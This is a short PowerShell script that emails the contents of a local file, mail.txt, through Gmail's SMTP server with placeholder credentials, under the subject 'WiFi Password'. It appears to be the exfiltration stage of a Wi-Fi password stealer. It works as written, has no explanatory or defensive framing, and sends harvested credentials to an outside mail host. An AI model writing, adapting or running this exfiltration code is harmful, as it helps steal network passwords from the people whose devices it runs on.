$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremailhere@gmail.com', 'youremailpasswordhere')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'youremailhere@gmail.com'
$ReportEmail.To.Add('youremailhere@gmail.com')
$ReportEmail.Subject = 'WiFi Password'
$ReportEmail.Body = (Get-Content mail.txt | out-string)
$SMTPInfo.Send($ReportEmail)

